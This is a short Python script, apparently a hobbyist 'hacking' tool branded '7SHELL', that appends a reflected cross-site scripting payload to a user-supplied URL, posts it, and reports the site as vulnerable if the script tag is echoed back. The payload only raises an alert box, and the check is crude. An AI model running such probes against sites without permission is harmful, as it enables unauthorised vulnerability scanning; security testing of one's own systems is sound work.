##########################################################
#                  DEVELOPED BY MOUNTED                  #
#                        7SHELL                          #
##########################################################
#bibliotecas a serem importadas
import os
import requests

#variaveis definidas
t = input("url ~> ")
payload = "<script>alert('exploited by 7shell');</script>"
req = requests.post(t+payload)

#verificar vulnerabilidade
if payload in req.text:
        print("\r\n\033[1;33m[!] Target vulnerable! [!]")
        print("- vulnerable url: {}{}".format(t,payload))
        print("- status code: {}".format(req.status_code))
else:
        print("\r\n\033[1;32m [+] Secure! [+]")